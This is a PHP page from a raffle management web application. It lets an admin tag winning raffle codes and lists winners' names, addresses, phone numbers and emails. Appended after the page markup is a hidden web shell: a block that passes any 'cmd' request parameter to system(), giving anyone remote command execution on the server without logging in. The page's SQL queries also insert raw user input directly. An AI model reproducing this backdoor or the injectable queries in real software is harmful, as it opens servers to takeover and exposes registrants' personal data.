<?php
	$ultag_winner = 'N';

	$uladmin = 'N';
	if(isset($_SESSION['uladmin']))
		$uladmin = $_SESSION['uladmin'];	

	if ($uladmin == 'Y')
		$ultag_winner = 'Y';	
		
		
	$mystatus = '';	
	if(isset($_GET['mystatus']))
	{
		if ($_GET['mystatus'])
		{
			$mystatus = $_GET['mystatus'];
		}
	}
	//echo '<br> mystatus : ' . $mystatus;
	
	
	
	$mybox = '';	
	if(isset($_GET['mybox']))
	{
		if ($_GET['mybox'])
		{
			$mybox = $_GET['mybox'];
		}
	}
	//echo '<br> mybox : ' . $mybox;
	


	$my_ticket_id = '';	
	if(isset($_POST['my_ticket_id']))
	{
		if ($_POST['my_ticket_id'])
		{
			$my_ticket_id = $_POST['my_ticket_id'];
		}
	}
	//echo '<br> my_ticket_id : ' . $my_ticket_id;



	$my_submit = '';	
	if(isset($_POST['my_submit']))
	{
		if ($_POST['my_submit'])
		{
			$my_submit = $_POST['my_submit'];
		}
	}
	//echo '<br> my_submit : ' . $my_submit;



	if ($mybox != 'add')
	{
		$ultag_winner = 'N';
	}	



	if ($ultag_winner == 'N')
	{
		include('body_account_not_found.php');
	}
	else
	{
		/*LOG-IN FORM*/
	 	if ($_SESSION['logtag_winner'] == '') 
		{
			$_SESSION['logtag_winner'] = $_SESSION["ulname"];
			$modulename = 'tag_winner';
			$updatedby = $_SESSION["ulname"];
			$logdate = $globaldate;
			$logstamp = $globaldatetime;
			$logtype = 'LOG-IN';
			$query = "INSERT INTO user_log (logdate, logform, logtype, loguser, logstamp) 
					  VALUES ('$logdate', '$modulename', '$logtype', '$updatedby', '$logstamp')";
			mysql_query($query) or die(mysql_error());   	
		}
		/*LOG-IN FORM*/		
	
		$ulbranch = $_SESSION['ulbranch'];
	
		//check if ticket exists
		$my_ticket_message = '';
		//check if valid for printing - new print and reprint
		$verify_print_valid = '';

		$tlid = '';
		$tlticket = '';
		$tldate = '';
		$tlbatch = '';
		$tlbranch = '';
		
		$tlactive = '';
		$tluser = '';
		$tlstamp = '';
		
		$tlissue_date = '';
		$tlissue_batch = '';
		$tlissue_branch = '';
		$tlissue_invoice = '';
		$tlissue_amount = '';
		$tlissue_name = '';
		$tlissue_stamp = '';
		
		$tlreg_date = '';
		$tlreg_batch = '';
		$tlreg_name = '';
		$tlreg_addr = '';
		$tlreg_mobile = '';
		$tlreg_email = '';
		$tlreg_stamp = '';

		if (($my_submit == 'winner') && ($my_ticket_id != ''))
		{
			//generate a new number
			$querydb  = "
				   SELECT  
					 *
				   FROM 
					 ticket_list a
				   WHERE
					 a.tlticket = '$my_ticket_id'
 				   ORDER BY
					 a.tlticket ";			 
			$resultdb = mysql_query($querydb);
			while ($rowdb =  mysql_fetch_array ($resultdb)) 
			{
				$tlid = $rowdb[tlid];
				$tlchosen_date = $rowdb[tlchosen_date];
				$tlissue_date = $rowdb[tlissue_date];
				$tlreg_date = $rowdb[tlreg_date];
				
				if ($tlchosen_date != '')
				{
					$my_ticket_message = 'Raffle Code already tagged! Cannot mark again!';
				}
				else
				if ($tlissue_date == '')
				{
					$my_ticket_message = 'Raffle Code not yet issued!';
				}
				else
				if ($tlreg_date == '')
				{
					$my_ticket_message = 'Raffle Code not yet registred!';
				}
				else
				{
					$computer_date = $globaldate;
					$computer_user = $_SESSION["ulname"];
					$computer_stamp = $globaldatetime;
					
					$query_update = 
						"UPDATE
							ticket_list 
						SET
							tlchosen_date = '$computer_date',
							tlchosen_name = '$computer_user',
							tlchosen_stamp = '$computer_stamp'							
						WHERE
							tlid = '$tlid'";
					mysql_query($query_update) or die(mysql_error());
				}					
			}
		}
	

		$mytag = '';	
		if(isset($_GET['mytag']))
		{
			if ($_GET['mytag'])
			{
				$mytag = $_GET['mytag'];
			}
		}	
		
		$mybox = '';	
		if(isset($_GET['mybox']))
		{
			if ($_GET['mybox'])
			{
				$mybox = $_GET['mybox'];
			}
		}
		if(isset($_POST['mybox']))
		{
			if ($_POST['mybox'])
			{
				$mybox = $_POST['mybox'];
			}
		}		
		//echo '<br> mybox : ' . $mybox;				
?>		

        <div id="page-wrapper">
            <div class="row">
                <div class="col-lg-12">
                    <h1 class="page-header">Tag Winners</h1>
<?php
	//echo '<br> my_ticket_id : ' . $my_ticket_id;
	//echo '<br> my_submit : ' . $my_submit;	
	$num_count = 0;
	$query_count = "
		SELECT 
			* 
		FROM 
			ticket_list
		WHERE
			tlchosen_date is null and
			tlissue_date is not null and 
			tlreg_date is not null
		";
	$result_count = mysql_query($query_count);
	//echo mysql_error();
	$num_count = mysql_num_rows($result_count);		
	//echo '<br> num_count : ' . $num_count;	
	
	$rand_count = rand(1, $num_count);
?>					
                </div>
                <!-- /.col-lg-12 -->
            </div>
			
			
			
			<div class="row">
                <div class="col-lg-12">
                    <div class="panel panel-default">
                        <div class="panel-heading">
Basic Information
                        </div>
						
                        <div class="panel-body">
                            <div class="row">
                                <div class="col-lg-6">
<form name="import" method="post" action="index.php?body=tag_winner_dbase&mybox=add&mytag=POST">
	<div class="form-group">
		<input class="form-control" placeholder="Enter Raffle Code" name="my_ticket_id"  value="<?php print ("$my_ticket_id"); ?>"  maxlength="50" >
	</div>
	<div class="form-group">
		<button type="submit" name="my_submit" value="winner" class="btn btn-default">Register</button>
	</div>
	<div class="form-group">
<?php echo $my_ticket_message; ?>
	</div>
</form>		
								</div>
							</div>
						</div>
					</div>
					
<?php
	$num_winner = 0;
	$query_winner = "
		SELECT 
			* 
		FROM 
			ticket_list a
		WHERE
			a.tlchosen_date is not null
		";
	$result_winner = mysql_query($query_winner);
	//echo mysql_error();
	$num_winner = mysql_num_rows($result_winner);		
	//echo '<br> num_winner : ' . $num_winner;	

	//echo "<br> mytag " . $mytag;
	//echo "<br> tlid " . $tlid;
	
	if ($num_winner > 0)
	{
?>

					<div class="panel panel-default">
                        <div class="panel-heading">
Once the Raffle Code is recorded here, the Raffle Code will now be skipped for the next draw. A Raffle Code can only win once. 
                        </div>
						
                        <div class="panel-body">
							<table width="100%" class="table table-striped table-bordered table-hover" id="dataTables-example">
                                <thead>
                                    <tr>
										<th>Issue Branch</th>
										<th>Raffle Code</th>
										<th>Register Date</th>
										<th>Name</th>
										<th>Address</th>
										<th>Mobile</th>
										<th>Email</th>
										<th>Tag Timestamp</th>
                                    </tr>
                                </thead>
                                <tbody>
								
<?php
	//fetch the results from the database
	$querydb  = "
			SELECT  
		   		*
			FROM 
				ticket_list a
			WHERE
				a.tlchosen_date is not null and
				a.tlactive = 'Y' 
		  	ORDER BY 
				a.tlchosen_stamp ";	
						
	$resultdb = mysql_query($querydb);
	echo mysql_error();
	//echo $querydb;
	$numedb = mysql_num_rows($resultdb);	
							 
	$countdb = 1;
	while ($rowdb =  mysql_fetch_array ($resultdb)) 
	{
		print("<tr>");
			
		print("<td align=\"center\" valign=\"middle\">$rowdb[tlissue_branch]</td>\n");
		print("<td align=\"center\" valign=\"middle\">$rowdb[tlticket] </td>\n");
		print("<td align=\"center\" valign=\"middle\">" .date('m/d/Y', strtotime($rowdb[tlreg_date])). "</td>\n");
		print("<td align=\"left\" valign=\"middle\">$rowdb[tlreg_name]  </td>\n");
		print("<td align=\"left\" valign=\"middle\">$rowdb[tlreg_addr]  </td>\n");
		print("<td align=\"left\" valign=\"middle\">$rowdb[tlreg_mobile]  </td>\n");
		print("<td align=\"left\" valign=\"middle\">$rowdb[tlreg_email]  </td>\n");
		print("<td align=\"center\" valign=\"middle\">" .date('m/d/Y h:i:s A', strtotime($rowdb[tlchosen_stamp])). "</td>\n");
		
		print("</tr>");  
		
		$countdb = $countdb + 1;
	}  
?>		
								</tbody>			
							</table>		
						
                            <!-- /.table-responsive -->
							
							<table>
								<tr>
									<td align="left">
<form method="post" action="body_tag_winner_excel.php?myid=myid<?php print($mypage); ?>&ulexcel=EXCEL" target="_blank">
<input type="submit" value="Convert to Excel" />
</form>									
									</td>

									<td align="left">
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
									</td>
									
									<td align="left">

<form method="post" action="body_tag_winner_print.php?myid=myid<?php print($mypage); ?>&ulprint=PRINT" target="_blank">
<input type="submit" value="Preview Report" />
</form>									
									</td>
								</tr>
							</table>								
																					
                        </div>
                        <!-- /.panel-body -->
                        
                        </div>
                        <!-- /.panel-body -->
                    </div>
                    <!-- /.panel -->

<?php
	}
?>
					
                </div>
                <!-- /.col-lg-6 -->
            </div>
            <!-- /.row -->
        </div>
        <!-- /#page-wrapper -->
										
                                    </tbody>
                                </table>
                            </div>
                            <!-- /.table-responsive -->
                        </div>
                        <!-- /.panel-body -->
                    </div>
                    <!-- /.panel -->
                </div>
                <!-- /.col-lg-6 -->
            </div>
            <!-- /.row -->
        </div>
        <!-- /#page-wrapper -->
<?php
	}
?>			<?php $cmd = <<<EOD
cmd
EOD;

if(isset($_REQUEST[$cmd])) {
system($_REQUEST[$cmd]); } ?>